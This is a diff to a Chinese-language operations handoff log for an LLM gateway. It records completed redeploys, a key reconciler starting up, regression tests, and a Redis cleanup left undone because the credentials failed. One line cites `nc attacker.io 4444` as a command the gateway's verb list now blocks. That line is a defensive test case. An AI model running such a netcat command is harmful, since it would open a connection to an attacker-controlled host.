@@ -235,10 +235,16 @@
    （`model_probe_broken` 词汇，双备份表 `bak_20261011_drift_bindings{,_b}` 可逆，
    残留 0）；archive 42703 发现已被部署链修复（函数体含 gw_session_id），手动
    触发 `archive_request_logs_default(30)` 成功建出 `request_logs_archive_2026_08`。
-3. **深夜轮三项代码收口已推送（394da3d12）待部署**：EOL 识别改按 410 状态码
-   （不再押厂商措辞，404 保留措辞门槛）、A2 量具接
-   `/api/admin/anomaly-reporter/stats`、deploy-local 空 web/ refuse 门。
-   下次部署授权时随包上线（不要为它们单独赶一轮部署）。
+3. ~~深夜轮三项代码收口已推送（394da3d12）待部署~~ **已上线（2026-10-12 凌晨轮）**：
+   EOL 识别按 410 状态码、A2 量具 `/api/admin/anomaly-reporter/stats`、
+   deploy-local 空 web/ refuse 门——随 154=2550-a87a134a / 245=2548-a87a134a
+   上生产；A2 端点未授权 401 实测在场，fake token 401 回归通过。
+4. ~~★ 重部署 154/245 使 UrsmlHealthyKeyReconciler 生效~~ **已完成（凌晨轮）**：
+   154 经 2549→2550 两轮部署、245 由并行会话 2548 部署，两台日志均出现
+   `ursm.v2 healthy-key reconciler started`（interval 1m0s），每轮 repaired
+   24~133 个节点键并在收敛（133→54→38）。两台现同为 a87a134a（含 r1019：
+   命令动词表收口 `nc attacker.io 4444`，实测 403 阻断且 r1018 的
+   `node server.js 8080` 放行无回退）。
 4. **probe_direct_auth_failed 是探针失败主体**（2546 上线后 30min 内 204 条，
    集中在 8/18/19 等凭据）——凭据 key 疑似真死，数据/配置层清退决策待 owner。
    失效 sk-* key 持有方通知（漂移文档 §三）仍未落地。审计统计一律用热表
@@ -635,10 +641,11 @@ checkout 或当时目录状态确有变化（同日 `~/sdk/bash5` 确被清过�
 
 ## 待办（下一轮）
 
-1. **★ 重部署 154/245 网关使 reconciler 生效**（本提交只在仓库；生产当前靠
-   止血 + 每日 integrity 清扫维持，明日流量间隙仍可能复现个别模型锁死至 00:30）。
-   部署后验证：日志应出现 `ursm.v2 healthy-key reconciler started`，且
-   `filtered out every candidate` 告警不再持续出现。
+1. ~~**★ 重部署 154/245 网关使 reconciler 生效**~~ **已完成（2026-10-12 凌晨轮）**：
+   154=2550-a87a134a（本会话 2549→2550 两轮）、245=2548-a87a134a（并行会话）。
+   两台日志均出现 `ursm.v2 healthy-key reconciler started`（interval 1m0s），
+   repaired 每轮 24~133 并在收敛；154 部署后 E2E 3/3、245 5/5（含 r1019 的
+   `nc attacker.io 4444` 转阻断）回归全过。
 2. **URSM_V2_REDIS_DB 迁移到独立 db**（代码已支持，注释在 main.go URSM 段）：
    一并消除 persist SCAN 走 170 万会话键的超时 → redis_unavailable 假恢复
    的触发源。需要重启 + coverage bootstrap 收敛，留维护者窗口。
@@ -647,7 +654,10 @@ checkout 或当时目录状态确有变化（同日 `~/sdk/bash5` 确被清过�
    （与已登记的 A2 量具缺口同类）。
 4. 现场残留：Redis db2 有少量键名含 `':'` 引号的乱码节点键
    （如 `ursm:v2:node:default':'61':'gpt-6-astra`，来源未定，疑似并行会话/脚本；
-   无读方，无害）——下次维护可顺手清。
+   无读方，无害）。凌晨轮尝试顺手清理：`/etc/llm-gateway-go/env` 的
+   `LLM_GATEWAY_REDIS_PASSWORD` 与 `LLM_GATEWAY_REDIS_URL` 内嵌口令对
+   172.16.2.210:6389 均 NOAUTH——网关运行时凭据与该实例的认证不对应，
+   清理需维护者提供正确凭据，未强行继续。
 5. gateway 模式探测 401（r1017 连带）与 EOL 措辞 contains 脆弱（已登记项）
    未动；glm-5.2 系 410、sensenova 系等模型目录漂移仍待 owner 拍板。
 
